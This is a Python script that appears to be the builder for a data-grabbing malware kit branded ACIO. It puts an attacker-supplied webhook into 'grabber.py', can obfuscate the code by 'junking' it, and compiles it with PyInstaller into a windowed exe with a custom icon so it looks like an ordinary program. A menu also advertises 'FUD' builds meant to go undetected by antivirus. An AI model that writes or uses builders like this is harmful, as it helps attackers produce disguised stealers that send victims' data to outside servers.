from pystyle import *
import os
import subprocess
from colorama import *
import time
from tkinter import filedialog, Tk

os.system('clear' if os.name == 'posix' else 'cls')

intro = """
                                 /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$ 
                                 /$$__  $$ /$$__  $$|_  $$_/ /$$__  $$
                                | $$  \ $$| $$  \__/  | $$  | $$  \ $$
                                | $$$$$$$$| $$        | $$  | $$  | $$
                                | $$__  $$| $$        | $$  | $$  | $$
                                | $$  | $$| $$    $$  | $$  | $$  | $$
                                | $$  | $$|  $$$$$$/ /$$$$$$|  $$$$$$/
                                |__/  |__/ \______/ |______/ \______/ 
                                            > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.blue_to_purple, Colorate.Vertical, interval=0.035, enter=True)


print(f"""{Fore.LIGHTCYAN_EX}
                                         /$$$$$$   /$$$$$$  /$$$$$$  /$$$$$$ 
                                         /$$__  $$ /$$__  $$|_  $$_/ /$$__  $$
                                        | $$  \ $$| $$  \__/  | $$  | $$  \ $$
                                        | $$$$$$$$| $$        | $$  | $$  | $$
                                        | $$__  $$| $$        | $$  | $$  | $$
                                        | $$  | $$| $$    $$  | $$  | $$  | $$
                                        | $$  | $$|  $$$$$$/ /$$$$$$|  $$$$$$/
                                        |__/  |__/ \______/ |______/ \______/ 

                                                  Welcome to builder

""")

time.sleep(1)


while True:
    Write.Print("\nWhich option do you want to choose: ", Colors.blue_to_purple)
    Write.Print("\n1. Build Exe", Colors.blue_to_purple)
    Write.Print("\n2. Build FUD Exe (Virus programs undetected)", Colors.blue_to_purple)
    Write.Print("\n3. Close", Colors.blue_to_purple)
    Write.Print("\nMake your selection: ", Colors.blue_to_purple, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)

        filename = "grabber.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} file updated.", Colors.blue_to_green)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nDo you want to junk your code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} The file has been junked.", Colors.blue_to_green)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_white)

        answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
        if answer.upper() == "Y":
            answer = input(Fore.CYAN + "\nDo you want to add an icon? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                Tk().withdraw()  
                icon_file = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
                if icon_file:
                    subprocess.call(["pyinstaller", "--onefile", "--windowed", "--icon", icon_file, filename])
                    Write.Print(f"\n{filename} has been converted to exe with the selected icon.", Colors.blue_to_green)
                else:
                    Write.Print("\nThe file you choose must have .ico extension!", Colors.red_to_purple)
            else:
                subprocess.call(["pyinstaller", "--onefile", "--windowed", filename])
                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.blue_to_green)

    elif choice == "2":
        Write.Print("\nWe can share the fud for free but not now.", Colors.red_to_yellow)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.green_to_white)
        break

    else:
        Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_white)
